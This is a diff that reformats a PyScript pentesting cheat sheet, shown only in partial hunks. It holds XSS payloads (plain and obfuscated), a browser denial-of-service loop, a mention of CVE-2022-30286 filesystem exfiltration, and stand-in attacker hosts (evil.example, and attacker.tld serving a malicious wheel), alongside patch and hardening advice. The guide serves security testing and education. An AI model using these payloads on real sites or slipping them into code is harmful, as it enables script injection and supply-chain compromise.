@@ -1,6 +1,5 @@
 # Pyscript
 
-
 ## PyScript Pentesting Guide
 
 PyScript is a new framework developed for integrating Python into HTML so, it can be used alongside HTML. In this cheat sheet, you'll find how to use PyScript for your penetration testing purposes.
@@ -17,12 +16,12 @@ Code:
   = fin.read() print(out)
 </py-script>
 ```
-```
+
 Result:
 
-![[https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png|]]
+![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
 
-### [[https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript|OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring)]]
+### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
 
 `CVE ID: CVE-2022-30286`\
 \
@@ -49,10 +48,10 @@ Code:
   ')
 </py-script>
 ```
-```
+
 Result:
 
-![[https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png|]]
+![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
 ### Cross Site Scripting (Ordinary)
 
@@ -63,10 +62,10 @@ Code:
         print("<img src=x onerror='alert(document.domain)'>")
 </py-script>
 ```
-```
+
 Result:
 
-![[https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png|]]
+![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
 
 ### Cross Site Scripting (Python Obfuscated)
 
@@ -83,10 +82,10 @@ y = "o";m = "ner";z = "ror\u003d"
 print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 </py-script>
 ```
-```
+
 Result:
 
-![[https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png|]]
+![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)
 
 ### Cross Site Scripting (JavaScript Obfuscation)
 
@@ -127,9 +126,9 @@ Code:
             (parseInt(_0x459bc5(0x98)) / 0xb) *
               (parseInt(_0x459bc5(0x96)) / 0xc)
           if (_0x168170 === _0x98a567) break
-          else _0x454121[[_0x454121["shift"]()|"push"]]
+          else _0x454121["push"](_0x454121["shift"]())
         } catch (_0x5baa73) {
-          _0x454121[[_0x454121["shift"]()|"push"]]
+          _0x454121["push"](_0x454121["shift"]())
         }
       }
     })(_0x599c, 0x28895),
@@ -159,10 +158,10 @@ Code:
   "")
 </py-script>
 ```
-```
+
 Result:
 
-![[https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png|]]
+![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
 
 ### DoS attack (Infinity loop)
 
@@ -174,10 +173,10 @@ Code:
   print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
 </py-script>
 ```
-```
+
 Result:
 
-![[https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png|]]
+![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
 
 ---
 
@@ -195,7 +194,7 @@ r = http.request("GET", "https://evil.example/302")      # will STILL follow the
 print(r.status, r.url)
 </script>
 ```
-```
+
 Patched in `urllib3 2.5.0` – upgrade the package in your PyScript image or pin a safe version in `packages = ["urllib3>=2.5.0"]`. See the official CVE entry for details.
 
 ### Arbitrary package loading & supply-chain attacks
@@ -210,7 +209,7 @@ packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
 import payload  # executes attacker-controlled code during installation
 </script>
 ```
-```
+
 *Only pure-Python wheels are required – no WebAssembly compilation step is needed.* Make sure configuration is not user-controlled and host trusted wheels on your own domain with HTTPS & SRI hashes.
 
 ### Output sanitisation changes (2023+)
@@ -221,11 +220,11 @@ import payload  # executes attacker-controlled code during installation
 ```python
 from pyscript import display, HTML
 
-display("**escaped**")          # renders literally
+display("<b>escaped</b>")          # renders literally
 
-display(HTML("**not\-escaped**")) # executes as HTML -> potential XSS if untrusted
+display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
 ```
-```
+
 This behaviour was introduced in 2023 and is documented in the official Built-ins guide. Rely on `display()` for untrusted input and avoid calling `print()` directly.
 
 ---
@@ -240,6 +239,6 @@ This behaviour was introduced in 2023 and is documented in the official Built-in
 
 ## References
 
-* [[https://nvd.nist.gov/vuln/detail/CVE-2025-50182|NVD – CVE-2025-50182]]
+* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
 * [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
 
